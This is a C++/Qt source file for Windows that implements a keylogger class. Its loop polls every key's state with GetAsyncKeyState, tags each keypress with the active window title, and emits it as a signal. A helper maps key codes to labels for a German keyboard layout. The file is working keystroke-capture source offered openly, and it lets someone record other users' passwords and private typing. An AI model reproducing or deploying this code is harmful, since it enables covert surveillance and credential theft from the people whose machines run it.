#include "keylogger.h"

#include <windows.h>
#include <QString>
#include <macros.h>

KeyLogger::KeyLogger(QObject* parent) : QObject(parent) {
}

QString codeToKey(unsigned char code);

void KeyLogger::startLog() {
  FUNCTION

  while(true) {
    Sleep(2); // give other programs time to run

    // get the active windowtitle
    char title[1024];
    HWND hwndHandle = GetForegroundWindow();
    WCHAR l_title[1024];
    GetWindowText(hwndHandle, l_title, 1023);
    wcstombs(title, l_title, 1024);

    // logging keys, thats the keylogger
    for(unsigned char c = 1; c < 255; c++) {
      SHORT rv = GetAsyncKeyState(c);
      if(rv & 1) { // on press button down
        QString key = codeToKey(c);

        KeyPress* keyPress = new KeyPress;
        keyPress->application(QString(title));
        QStringList keys = keyPress->keys();
        keys.push_back(key);
        keyPress->keys(keys);
        emit keyPressed(keyPress);
      }
    }
  }
}

QString codeToKey(unsigned char code) {
  if((code >= 65 && code <= 90) || (code >= 48 && code <= 57) || (code == 32))
    return QString(QChar(code));
  else if(code >= 96 && code <= 105)
    return QString("[NUM ").append(code - 96).append("]");
  else if(code >= 112 && code <= 123)
    return QString("[F").append(code - 111).append("]");

  switch(code) {
  case 1:
    return "[LMOUSE]"; // mouse left
  case 2:
    return "[RMOUSE]"; // mouse right
  case 4:
    return "[MMOUSE]"; // mouse middle
  case 13:
    return "[RETURN]";
  case 16:
  case 17:
  case 18:
    return "";
  case 160:
  case 161:
    return "[SHIFT]"; // lastc == 16
  case 162:
  case 163:
    return "[STRG]"; // lastc == 17
  case 164:
    return "[ALT]"; // lastc == 18
  case 165:
    return "[ALT GR]";
  case 8:
    return "[BACKSPACE]";
  case 9:
    return "[TAB]";
  case 27:
    return "[ESC]";
  case 33:
    return "[PAGE UP]";
  case 34:
    return "[PAGE DOWN]";
  case 35:
    return "[HOME]";
  case 36:
    return "[POS1]";
  case 37:
    return "[ARROW LEFT]";
  case 38:
    return "[ARROW UP]";
  case 39:
    return "[ARROW RIGHT]";
  case 40:
    return "[ARROW DOWN]";
  case 45:
    return "[INS]";
  case 46:
    return "[DEL]";
  case 91:
  case 92:
    return "[WIN]";
  case 106:
    return "[NUM /]";
  case 107:
    return "[NUM +]";
  case 109:
    return "[NUM -]";
  case 110:
    return "[NUM ,]";
  case 144:
    return "[NUM]";
  case 192:
    return "[OE]";
  case 222:
    return "[AE]";
  case 186:
    return "[UE]";
  case 187:
    return "+";
  case 188:
    return ",";
  case 189:
    return "-";
  case 190:
    return ".";
  case 191:
    return "#";
  case 226:
    return "<";
  default:
    return QString("[KEY \\").append(code).append("]");
  }
}
